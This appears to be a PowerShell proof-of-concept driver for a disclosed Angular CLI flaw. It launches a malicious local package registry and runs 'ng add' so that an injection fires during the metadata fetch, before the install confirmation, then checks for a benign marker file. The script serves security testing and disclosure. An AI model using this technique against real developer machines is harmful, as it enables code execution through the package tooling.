# W1 E2E — run from the fixture dir (malrepo/). Start the registry server FIRST.
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$reg = Join-Path $here 'registry-server.cjs'
$marker = Join-Path $env:TEMP 'w1-poc'
Remove-Item $marker -ErrorAction SilentlyContinue

# 1. Start the malicious registry (spawn, keep alive)
$regProc = Start-Process -FilePath 'node' -ArgumentList @($reg, '4873') -PassThru -NoNewWindow

try {
  Start-Sleep -Seconds 1
  # 2. Version/detection precondition check (must print <2 => yarn-classic)
  Write-Host 'yarn version:' (yarn --version)
  # 3. Trigger (metadata fetch fires BEFORE the confirmation gate)
  Write-Host '>> ng add w1-poc-pkg'
  ng add w1-poc-pkg --skip-confirmation 2>&1 | Out-Host
  # NOTE: --skip-confirmation only skips the install gate; the injection fires during the
  # metadata fetch that precedes it (add/cli.ts:221 loadPackageInfoTask BEFORE :227 confirmInstallationTask).
} finally {
  if (Test-Path $marker) { Write-Host "MARKER PRESENT: $marker" } else { Write-Host 'MARKER ABSENT' }
  Stop-Process -Id $regProc.Id -Force -ErrorAction SilentlyContinue
  Write-Host '>> cleanup: registry stopped; marker left at' $marker '(delete after recording)'
}

